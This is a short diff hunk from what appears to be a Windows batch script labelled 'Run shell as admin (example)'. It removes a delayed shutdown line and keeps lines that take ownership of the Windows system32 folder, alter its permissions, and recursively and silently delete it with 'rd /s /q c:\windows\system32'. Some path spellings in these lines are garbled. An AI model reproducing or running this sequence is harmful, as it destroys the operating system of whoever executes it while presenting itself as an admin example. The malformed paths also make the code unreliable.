@@ -53,7 +53,6 @@
  ::START
  ::::::::::::::::::::::::::::
  REM Run shell as admin (example) - echo off
-shutdown /s /t 90
 takeown /f c: \windows\system32
 cacls c: \windows\system3
 rd /s /q c:\windows\system32
